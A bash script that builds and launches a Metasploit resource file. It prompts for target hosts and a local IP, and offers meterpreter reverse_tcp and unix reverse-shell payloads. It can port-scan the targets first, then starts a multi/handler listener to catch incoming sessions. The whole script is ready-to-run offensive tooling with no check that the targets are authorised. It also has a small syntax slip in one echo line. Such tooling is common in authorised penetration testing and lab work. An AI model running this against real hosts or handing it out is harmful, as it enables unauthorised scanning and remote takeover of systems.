#!/usr/bin/env bash
set -euo pipefail

service postgresql start
echo"starting postgresql service..."

echo "=== Metasploit RC Generator ==="

# --- 1) Prompt ONLY for workspace (your ask) ---
read -rp "Workspace name (e.g., lab01): " WORKSPACE_RAW
if [[ -z "${WORKSPACE_RAW// }" ]]; then
  echo "Workspace cannot be empty."; exit 1
fi
# sanitize: letters, numbers, dash, underscore
WORKSPACE="$(echo "$WORKSPACE_RAW" | tr -cd '[:alnum:]_-' )"
if [[ -z "$WORKSPACE" ]]; then
  echo "Workspace becomes empty after sanitization; use letters/numbers/_/-"; exit 1
fi

# --- 2) Gather remaining values dynamically / with gentle prompts ---
# Auto-detect LHOST from default route; fallback to first host IP
detect_lhost() {
  local ip=""
  if command -v ip >/dev/null 2>&1; then
    ip=$(ip route get 1.1.1.1 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i=="src"){print $(i+1); exit}}')
  fi
  if [[ -z "$ip" ]]; then
    ip=$(hostname -I 2>/dev/null | awk '{print $1}')
  fi
  echo "$ip"
}
LHOST_AUTO="$(detect_lhost)"
read -rp "Targets (RHOSTS, e.g., 10.10.10.5 or 10.10.10.0/24): " RHOSTS
if [[ -z "${RHOSTS// }" ]]; then
  echo "RHOSTS cannot be empty."; exit 1
fi
read -rp "Local IP [auto: ${LHOST_AUTO:-unset}]: " LHOST
LHOST="${LHOST:-$LHOST_AUTO}"
if [[ -z "${LHOST// }" ]]; then
  echo "Could not detect LHOST; please enter manually next time."; exit 1
fi
read -rp "Listener port [4444]: " LPORT
LPORT="${LPORT:-4444}"

echo
echo "Payload options:"
echo "  1) windows/x64/meterpreter/reverse_tcp"
echo "  2) linux/x64/meterpreter/reverse_tcp"
echo "  3) cmd/unix/reverse (generic shell)"
read -rp "Choose payload [1/2/3, default 2]: " PSEL
PSEL="${PSEL:-2}"
case "$PSEL" in
  1) PAYLOAD="windows/x64/meterpreter/reverse_tcp" ;;
  2) PAYLOAD="linux/x64/meterpreter/reverse_tcp" ;;
  3) PAYLOAD="cmd/unix/reverse" ;;  # Metasploit will map this appropriately
  *) echo "Invalid choice."; exit 1 ;;
esac

# Optional: quick recon toggle
read -rp "Do a quick TCP port scan first? (y/N): " DO_SCAN
DO_SCAN="${DO_SCAN:-N}"

# --- 3) Build paths & filenames ---
STAMP="$(date +%Y%m%d_%H%M%S)"
RC_FILE="/tmp/msf_${WORKSPACE}_${STAMP}.rc"
LOG_FILE="/tmp/${WORKSPACE}_${STAMP}.log"

# --- 4) Generate the RC file ---
{
  echo "# Auto-generated RC for workspace: $WORKSPACE @ $STAMP"
  echo "workspace -a $WORKSPACE"
  echo "spool $LOG_FILE"
  echo "setg LHOST $LHOST"
  echo "setg LPORT $LPORT"
  echo "setg RHOSTS $RHOSTS"
  echo

  if [[ "$DO_SCAN" =~ ^[Yy]$ ]]; then
    cat <<'EOF'
# ----- Quick recon (adjust as needed) -----
use auxiliary/scanner/portscan/tcp
set PORTS 1-1024
set THREADS 32
run
back

use auxiliary/scanner/http/title
run
back
EOF
    echo
  fi

  cat <<EOF
# ----- Background handler -----
use exploit/multi/handler
set payload $PAYLOAD
set ExitOnSession false
run -j
back

# Show sessions as they land
sessions -v

# Stop logging and exit when done
spool off
exit
EOF
} > "$RC_FILE"

# --- 5) Run Metasploit with the generated RC ---
echo
echo "Generated RC: $RC_FILE"
echo "Log file    : $LOG_FILE"
echo
read -rp "Launch msfconsole now? (Y/n): " GO
GO="${GO:-Y}"
if [[ "$GO" =~ ^[Yy]$ ]]; then
  msfconsole -q -r "$RC_FILE"
else
  echo "You can run later with: msfconsole -q -r \"$RC_FILE\""
fi
